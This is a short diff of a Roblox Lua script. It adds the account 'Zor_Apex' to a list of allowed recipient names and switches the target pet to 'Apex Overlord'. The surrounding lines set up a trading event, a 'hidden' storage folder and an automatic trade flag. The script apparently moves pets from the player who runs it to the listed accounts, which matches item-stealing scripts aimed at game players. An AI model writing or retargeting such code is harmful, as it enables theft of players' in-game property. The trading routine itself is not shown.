@@ -4,6 +4,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local event = ReplicatedStorage:WaitForChild("rEvents", 5) and ReplicatedStorage.rEvents:WaitForChild("tradingEvent", 5)
 local ALLOWED_DISPLAY_NAMES = {
+    "Zor_Apex",
     "Zor_Darkstar1",
     "Zor_Darkstar2",
     "Zor_Darkstar3",
@@ -22,7 +23,7 @@ local petsFolder = LocalPlayer:WaitForChild("petsFolder", 5)
 local hiddenStorage = ReplicatedStorage:FindFirstChild("ZorVexStorage") or Instance.new("Folder", ReplicatedStorage)
 hiddenStorage.Name = "ZorVexStorage"
 
-local PetName = "Darkstar Hunter"
+local PetName = "Apex Overlord"
 local amount = 30
 local petOriginTable = {}
 local autoTradeActive = true
